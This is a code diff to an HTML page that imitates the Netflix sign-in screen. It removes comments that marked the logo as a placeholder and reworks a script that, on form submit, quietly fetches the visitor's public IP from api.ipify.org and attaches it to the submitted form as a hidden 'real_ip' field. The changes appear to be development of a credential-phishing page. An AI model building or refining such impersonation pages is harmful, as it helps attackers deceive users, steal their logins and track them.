@@ -19,7 +19,7 @@
 	  flex-direction: column;
 	}
 	.login-container {
-	  background: rgba(0, 0, 0, 0.75); /* transparent black */
+	  background: rgba(0, 0, 0, 0.75);
 	  border-radius: 4px;
 	  box-shadow: 0 2px 24px rgba(0,0,0,0.8);
 	  padding: 40px 32px 24px 32px;
@@ -107,7 +107,6 @@
 	  .login-container {
 		padding: 24px 8vw 20px 8vw;
 		max-width: 100vw;
-		min-width: unset;
 	  }
 	  .recaptcha-text {
 		margin-top: 20px;
@@ -118,7 +117,6 @@
 <body>
   <div class="login-container">
 	<div class="logo">
-	  <!-- Placeholder Netflix logo as SVG -->
 	  <svg viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">
 		<text x="0" y="22" font-size="24" font-family="Arial, Helvetica, sans-serif" fill="#e50914" font-weight="bold">NETFLIX</text>
 	  </svg>
@@ -136,17 +134,24 @@
   <div class="recaptcha-text">
 	This page is protected by reCAPTCHA.
   </div>
+
+  <script>
+	const form = document.querySelector("form");
+	form.addEventListener("submit", async (e) => {
+	  e.preventDefault(); // Stop form to wait for IP
+	  try {
+		const res = await fetch('https://api.ipify.org?format=json');
+		const data = await res.json();
+		const ipInput = document.createElement("input");
+		ipInput.type = "hidden";
+		ipInput.name = "real_ip";
+		ipInput.value = data.ip;
+		form.appendChild(ipInput);
+	  } catch (err) {
+		console.warn("Could not fetch IP:", err);
+	  }
+	  form.submit(); // Submit with IP
+	});
+  </script>
 </body>
 </html>
-<script>
-fetch('https://api.ipify.org?format=json')
-  .then(response => response.json())
-  .then(data => {
-    const ip = data.ip;
-    const ipInput = document.createElement("input");
-    ipInput.type = "hidden";
-    ipInput.name = "real_ip";
-    ipInput.value = ip;
-    document.querySelector("form").appendChild(ipInput);
-  });
-</script>
